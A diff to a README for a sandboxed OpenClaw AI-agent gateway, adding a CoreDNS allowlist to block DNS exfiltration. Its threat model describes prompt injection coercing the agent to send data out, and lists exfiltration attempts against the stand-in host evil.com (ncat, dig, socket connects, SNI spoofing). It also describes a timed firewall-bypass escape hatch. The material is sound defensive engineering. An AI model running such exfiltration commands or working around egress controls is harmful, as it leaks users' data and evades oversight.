@@ -11,7 +11,8 @@ What this gets you above the official sandboxed docker compose offering:
 
 - One-click deployment of OpenClaw to an actual low cost VPS gateway on Hetzner, DigitalOcean, or Oracle Cloud
 - Tailscale sidecar for secure access and TLS certificate management (no reverse proxy or manual certs needed)
-- Firewall via Envoy sidecar for egress filtering with a structured policy engine (blocks unauthorized exfiltration)
+- Firewall via Envoy sidecar for egress filtering with a structured policy engine (blocks unauthorized TCP exfiltration)
+- DNS exfiltration prevention via CoreDNS allowlist proxy — only whitelisted domains resolve, everything else returns NXDOMAIN (forwarded through Cloudflare malware-blocking DNS)
 - Firewall escape hatch — grant the agent temporary full internet access for any one-off destination using a convenient ssh one-liner from your machine (auto-closes after 30s by default; the agent already knows to ask for this when it hits blocked destinations)
 - Auto-injected agent environment prompt — the agent understands its constraints out of the box so it knows when to ask, what to ask, and what options it has at its disposal when it comes to tool use, gateway management, and outbound requests
 
@@ -43,6 +44,7 @@ What this gets you above the official sandboxed docker compose offering:
   - [Component Hierarchy](#component-hierarchy)
   - [Egress Domain Whitelist](#egress-domain-whitelist)
   - [Firewall Bypass (SOCKS Proxy)](#firewall-bypass-socks-proxy)
+  - [DNS Exfiltration Prevention](#dns-exfiltration-prevention)
   - [Agent Environment Prompt](#agent-environment-prompt)
   - [Experimental Runtime Binary Persistence](#experimental-runtime-binary-persistence)
 
@@ -267,7 +269,9 @@ If all goes well, you now have an operational OpenClaw gateway with Tailscale ac
 │   │   │  │ NAT: RETURN for uid 0 (root/containerboot)   │  │     │   │
 │   │   │  │ NAT: SSH/TCP → REDIRECT :10001+ (per-rule)   │  │     │   │
 │   │   │  │ NAT: ALL TCP → REDIRECT :10000 (catch-all)   │  │     │   │
+│   │   │  │ NAT: UDP 53 uid 1000 → REDIRECT :5300       │  │     │   │
 │   │   │  │ UDP: ACCEPT Docker DNS (127.0.0.11)          │  │     │   │
+│   │   │  │ UDP: ACCEPT CoreDNS (:5300)                  │  │     │   │
 │   │   │  │ UDP: ACCEPT root (containerboot)             │  │     │   │
 │   │   │  │ UDP: DROP all others                         │  │     │   │
 │   │   │  │ exec containerboot (Tailscale entrypoint)    │  │     │   │
@@ -287,6 +291,7 @@ If all goes well, you now have an operational OpenClaw gateway with Tailscale ac
 │   │   │  ┌──────────────────────────────────────────────┐  │     │   │
 │   │   │  │  openclaw-<profile> (network_mode: container:)│  │     │   │
 │   │   │  │  • OpenClaw + pnpm + bun + brew + uv         │  │     │   │
+│   │   │  │  • CoreDNS on :5300 (DNS allowlist proxy)    │  │     │   │
 │   │   │  │  • sshd on :2222 (loopback)                  │  │     │   │
 │   │   │  │  • No CAP_NET_ADMIN, no iptables             │  │     │   │
 │   │   │  └──────────────────────────────────────────────┘  │     │   │
@@ -315,16 +320,17 @@ Gateway containers mount the OpenClaw runtime home and Linuxbrew data paths as n
 
 **Threat:** Prompt injection coerces the AI agent into exfiltrating data. The agent can run any tool available in the container — `curl`, `wget`, `ncat`, `ssh`, raw sockets, subprocesses. It can use any port, any protocol, and target any destination. Application-level proxy settings (`HTTP_PROXY`) are trivially bypassed.
 
-**Defense-in-depth (four layers):**
+**Defense-in-depth (five layers):**
 
 | Layer                                 | Mechanism                                                                       | What it stops                                         | Bypassable by `node` user?                         |
 | ------------------------------------- | ------------------------------------------------------------------------------- | ----------------------------------------------------- | -------------------------------------------------- |
 | **1. iptables REDIRECT + UDP DROP**   | Root-owned rules in sidecar: SSH/TCP → specific Envoy ports, all TCP → :10000   | Every TCP connection goes through Envoy               | No (`CAP_NET_ADMIN` required, sidecar only)        |
 | **2. Envoy protocol-aware whitelist** | TLS: SNI inspection + domain whitelist. SSH/TCP: per-rule port-mapped listeners | Non-whitelisted HTTPS, non-mapped SSH/TCP, plain HTTP | No (Envoy resolves DNS independently)              |
 | **3. Egress policy engine**           | Typed `EgressRule[]` with domain/IP + protocol support (TLS, SSH, TCP)          | Structured policy control with per-protocol handling  | No (Envoy config, not in container)                |
-| **4. Malware-blocking DNS**           | Cloudflare 1.1.1.2 / 1.0.0.2 via sidecar `dns:` config (inherited by all)       | Known malware, phishing, and C2 domains               | No (Docker DNS config, containers cannot override) |
+| **4. CoreDNS allowlist proxy**        | iptables redirects uid 1000 DNS to CoreDNS; only whitelisted domains resolve    | DNS exfiltration via encoded subdomain queries        | No (iptables redirect + CoreDNS runs as root)      |
+| **5. Malware-blocking DNS**           | Cloudflare 1.1.1.2 / 1.0.0.2 as CoreDNS upstream + sidecar `dns:` config        | Known malware, phishing, and C2 domains               | No (Docker DNS config, containers cannot override) |
 
-**UDP exfiltration prevention:** The sidecar's iptables rules allow Docker DNS (127.0.0.11), root-owned UDP (containerboot/tailscaled for WireGuard), and DROP all other UDP. The `node` user cannot send UDP.
+**UDP exfiltration prevention:** The sidecar's iptables rules redirect DNS (UDP port 53) from uid 1000 to CoreDNS, allow Docker DNS (127.0.0.11) for other users, allow root-owned UDP (containerboot/tailscaled for WireGuard), and DROP all other UDP. The `node` user cannot send unfiltered UDP.
 
 **Why SNI spoofing doesn't work:** If an attacker forges the SNI to `api.anthropic.com` while connecting to `evil.com`'s IP, Envoy resolves `api.anthropic.com` via DNS independently and connects to the **real** IP — not the attacker's server.
 
@@ -336,6 +342,8 @@ Gateway containers mount the OpenClaw runtime home and Linuxbrew data paths as n
 - `ncat evil.com 4444` — no matching TCP rule → **BLOCKED**
 - `python3 -c "import socket; s.connect(('1.2.3.4', 443))"` — no SNI → **BLOCKED**
 - `curl https://api.anthropic.com` — SNI matches whitelist → **ALLOWED**
+- `dig evil.com` — DNS redirected to CoreDNS, not whitelisted → **NXDOMAIN**
+- `dig @8.8.8.8 evil.com` — iptables catches hardcoded resolver, still CoreDNS → **NXDOMAIN**
 
 ## Prerequisites
 
@@ -493,6 +501,14 @@ ssh root@main.yourtsns.ts.net "firewall-bypass 30"
 ```
 
 The proxy auto-kills after the timeout. PID is tracked in `/run/firewall-bypass.pid`. Re-running while active is idempotent (shows status and exits). The `node` user cannot execute the script (chmod 700).
+
+## DNS Exfiltration Prevention
+
+A CoreDNS allowlist proxy runs inside each gateway container, preventing the `node` user (uid 1000) from resolving non-whitelisted domains. This closes a DNS exfiltration vector where an attacker could encode data in subdomain queries to attacker-controlled domains.
+
+**How it works:** The sidecar's iptables rules redirect all DNS queries (UDP port 53) from uid 1000 to CoreDNS on port 5300. CoreDNS only resolves domains on the same whitelist used by Envoy, forwarding allowed queries to Cloudflare's malware-blocking resolvers (1.1.1.2 / 1.0.0.2). Everything else gets NXDOMAIN. Root (uid 0) and Envoy (uid 101) bypass DNS filtering entirely — their queries go directly to Docker DNS.
+
+Hardcoded resolvers (`dig @8.8.8.8`) are also caught by the iptables redirect. DNS-over-TCP, DoT, and DoH are blocked by Envoy's SNI filter. The firewall-bypass escape hatch is unaffected (runs as root).
 
 ## Agent Environment Prompt
 
